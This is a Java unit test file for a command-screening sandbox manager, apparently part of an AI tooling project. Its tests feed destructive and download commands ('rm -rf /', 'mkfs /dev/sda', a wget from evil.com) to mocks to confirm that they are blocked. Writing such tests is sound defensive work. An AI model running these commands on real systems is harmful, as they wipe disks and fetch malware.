package org.wall.im.ai.sandbox;

import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Nested;
import org.junit.jupiter.api.Test;
import org.wall.im.ai.core.model.SandboxConfig;
import org.wall.im.ai.core.sandbox.Sandbox;
import org.wall.im.ai.core.sandbox.SandboxLifecycleListener;
import org.wall.im.ai.core.sandbox.SandboxResult;
import org.wall.im.ai.core.sandbox.policy.CommandPolicy;

import java.util.List;

import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertTrue;
import static org.mockito.ArgumentMatchers.any;
import static org.mockito.ArgumentMatchers.anyString;
import static org.mockito.ArgumentMatchers.eq;
import static org.mockito.Mockito.doThrow;
import static org.mockito.Mockito.mock;
import static org.mockito.Mockito.verify;
import static org.mockito.Mockito.verifyNoInteractions;
import static org.mockito.Mockito.when;

/**
 * SandboxManager 单元测试
 * <p>
 * 旧 3 个 @Nested（DangerousOperationTest/SandboxDisabledTest/PathAccessTest）用旧构造器 验证向后兼容； 新
 * 3 个 @Nested（PolicyInjectionTest/RegistryRouteTest/LifecycleListenerTest）验证策略注入、
 * Registry 路由、 生命周期监听新能力。
 * </p>
 */
@DisplayName("SandboxManager测试")
class SandboxManagerTest {

	@Nested
	@DisplayName("危险操作检测测试")
	class DangerousOperationTest {

		@Test
		@DisplayName("包含rm -rf / 应被拦截")
		void rmRfRoot_shouldBeBlocked() {
			SandboxConfig config = createEnabledConfig();
			Sandbox sandbox = mock(Sandbox.class);
			SandboxManager manager = new SandboxManager(sandbox, config);

			SandboxResult result = manager.safeExecute("rm -rf /");

			assertFalse(result.isSuccess());
			assertTrue(result.getErrorOutput().contains("Dangerous"));
			verifyNoInteractions(sandbox);
		}

		@Test
		@DisplayName("包含wget应被拦截")
		void wget_shouldBeBlocked() {
			SandboxConfig config = createEnabledConfig();
			Sandbox sandbox = mock(Sandbox.class);
			SandboxManager manager = new SandboxManager(sandbox, config);

			SandboxResult result = manager.safeExecute("wget http://evil.com/malware");

			assertFalse(result.isSuccess());
			verifyNoInteractions(sandbox);
		}

		@Test
		@DisplayName("包含mkfs应被拦截")
		void mkfs_shouldBeBlocked() {
			SandboxConfig config = createEnabledConfig();
			Sandbox sandbox = mock(Sandbox.class);
			SandboxManager manager = new SandboxManager(sandbox, config);

			SandboxResult result = manager.safeExecuteCommand("mkfs /dev/sda");

			assertFalse(result.isSuccess());
			verifyNoInteractions(sandbox);
		}

		@Test
		@DisplayName("安全命令应正常执行")
		void safeCommand_shouldExecute() {
			SandboxConfig config = createEnabledConfig();
			Sandbox sandbox = mock(Sandbox.class);
			when(sandbox.execute(anyString(), anyString())).thenReturn(SandboxResult.success("ok", 10));
			SandboxManager manager = new SandboxManager(sandbox, config);

			SandboxResult result = manager.safeExecute("echo hello");

			assertTrue(result.isSuccess());
			verify(sandbox).execute("echo hello", config.getWorkDir());
		}

	}

	@Nested
	@DisplayName("沙盒禁用测试")
	class SandboxDisabledTest {

		@Test
		@DisplayName("沙盒禁用时应直接执行不检查危险操作")
		void disabled_shouldExecuteWithoutCheck() {
			SandboxConfig config = new SandboxConfig();
			config.setEnabled(false);
			Sandbox sandbox = mock(Sandbox.class);
			when(sandbox.execute(anyString(), any())).thenReturn(SandboxResult.success("done", 5));

			SandboxManager manager = new SandboxManager(sandbox, config);
			SandboxResult result = manager.safeExecute("rm -rf /");

			assertTrue(result.isSuccess());
			verify(sandbox).execute("rm -rf /", null);
		}

	}

	@Nested
	@DisplayName("路径访问检查测试")
	class PathAccessTest {

		@Test
		@DisplayName("canAccess应委托给sandbox.isPathAllowed")
		void canAccess_shouldDelegateToSandbox() {
			SandboxConfig config = createEnabledConfig();
			Sandbox sandbox = mock(Sandbox.class);
			when(sandbox.isPathAllowed("/safe/path")).thenReturn(true);
			when(sandbox.isPathAllowed("/dangerous/path")).thenReturn(false);

			SandboxManager manager = new SandboxManager(sandbox, config);

			assertTrue(manager.canAccess("/safe/path"));
			assertFalse(manager.canAccess("/dangerous/path"));
		}

	}

	@Nested
	@DisplayName("策略注入测试")
	class PolicyInjectionTest {

		@Test
		@DisplayName("注入策略返回 false 时 sandbox 不被调用")
		void policyDeny_shouldNotCallSandbox() {
			SandboxConfig config = createEnabledConfig();
			Sandbox sandbox = mock(Sandbox.class);
			CommandPolicy policy = mock(CommandPolicy.class);
			when(policy.isAllowed(anyString())).thenReturn(false);
			SandboxManager manager = new SandboxManager(sandbox, config, policy);

			SandboxResult result = manager.safeExecute("some risky cmd");

			assertFalse(result.isSuccess());
			verifyNoInteractions(sandbox);
		}

		@Test
		@DisplayName("注入策略返回 true 时正常执行")
		void policyAllow_shouldExecute() {
			SandboxConfig config = createEnabledConfig();
			Sandbox sandbox = mock(Sandbox.class);
			when(sandbox.execute(anyString(), anyString())).thenReturn(SandboxResult.success("ok", 10));
			CommandPolicy policy = mock(CommandPolicy.class);
			when(policy.isAllowed(anyString())).thenReturn(true);
			SandboxManager manager = new SandboxManager(sandbox, config, policy);

			SandboxResult result = manager.safeExecute("echo hello");

			assertTrue(result.isSuccess());
			verify(sandbox).execute("echo hello", config.getWorkDir());
		}

	}

	@Nested
	@DisplayName("Registry 路由测试")
	class RegistryRouteTest {

		@Test
		@DisplayName("基于 Registry 创建 sandbox 并路由执行")
		void registryRoute_shouldCreateAndExecute() {
			SandboxConfig config = createEnabledConfig();
			SandboxRegistry registry = mock(SandboxRegistry.class);
			Sandbox sandbox = mock(Sandbox.class);
			when(sandbox.execute(anyString(), anyString())).thenReturn(SandboxResult.success("ok", 5));
			when(registry.create(config)).thenReturn(sandbox);

			SandboxManager manager = new SandboxManager(config, registry);

			SandboxResult result = manager.safeExecute("echo hello");

			assertTrue(result.isSuccess());
			verify(registry).create(config);
			verify(sandbox).execute("echo hello", config.getWorkDir());
		}

		@Test
		@DisplayName("Registry 路由时 manager 销毁应销毁 sandbox")
		void registryRoute_destroyShouldDestroySandbox() {
			SandboxConfig config = createEnabledConfig();
			SandboxRegistry registry = mock(SandboxRegistry.class);
			Sandbox sandbox = mock(Sandbox.class);
			when(registry.create(config)).thenReturn(sandbox);

			SandboxManager manager = new SandboxManager(config, registry);
			manager.destroy();

			verify(sandbox).destroy();
		}

	}

	@Nested
	@DisplayName("生命周期监听测试")
	class LifecycleListenerTest {

		@Test
		@DisplayName("onPreExecute 和 onPostExecute 应被调用")
		void listeners_shouldBeCalled() {
			SandboxConfig config = createEnabledConfig();
			Sandbox sandbox = mock(Sandbox.class);
			when(sandbox.execute(anyString(), anyString())).thenReturn(SandboxResult.success("ok", 5));
			SandboxLifecycleListener listener = mock(SandboxLifecycleListener.class);
			CommandPolicy policy = mock(CommandPolicy.class);
			when(policy.isAllowed(anyString())).thenReturn(true);
			SandboxManager manager = new SandboxManager(sandbox, config, policy, List.of(listener));

			manager.safeExecute("echo hello");

			verify(listener).onPreExecute(eq(sandbox), eq("echo hello"), any());
			verify(listener).onPostExecute(eq(sandbox), any(), any());
		}

		@Test
		@DisplayName("listener 抛异常不应影响主流程")
		void listenerThrows_shouldNotAffectMain() {
			SandboxConfig config = createEnabledConfig();
			Sandbox sandbox = mock(Sandbox.class);
			when(sandbox.execute(anyString(), anyString())).thenReturn(SandboxResult.success("ok", 5));
			SandboxLifecycleListener listener = mock(SandboxLifecycleListener.class);
			doThrow(new RuntimeException("listener error")).when(listener).onPreExecute(any(), any(), any());
			CommandPolicy policy = mock(CommandPolicy.class);
			when(policy.isAllowed(anyString())).thenReturn(true);
			SandboxManager manager = new SandboxManager(sandbox, config, policy, List.of(listener));

			SandboxResult result = manager.safeExecute("echo hello");

			assertTrue(result.isSuccess());
		}

	}

	private SandboxConfig createEnabledConfig() {
		SandboxConfig config = new SandboxConfig();
		config.setEnabled(true);
		config.setWorkDir("/tmp/sandbox");
		return config;
	}

}
